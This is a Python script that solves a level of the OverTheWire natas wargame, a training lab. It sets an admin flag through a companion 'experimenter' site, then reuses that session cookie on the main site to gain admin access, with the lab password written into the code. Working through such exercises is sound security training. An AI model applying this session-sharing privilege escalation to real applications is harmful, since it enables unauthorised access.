#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re 

usn = 'natas21'
url = "http://%s.natas.labs.overthewire.org/?debug=true" % usn
experimenter = "http://%s-experimenter.natas.labs.overthewire.org/?debug=true&admin=1" % usn
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
login = (usn, password)
request = requests.Session()

def get_source_code():
  connection = request.get(experimenter, auth = login)

  pageContent = connection.text
  print request.cookies["PHPSESSID"]


def solve_lab():
    response = request.post(experimenter, data = {"admin": "1", "submit" : "1"}, auth = login)
    current_sessid = request.cookies["PHPSESSID"]
    print response.text

    response = request.get(url, cookies = {"PHPSESSID" : current_sessid}, auth = login)
    print response.text 
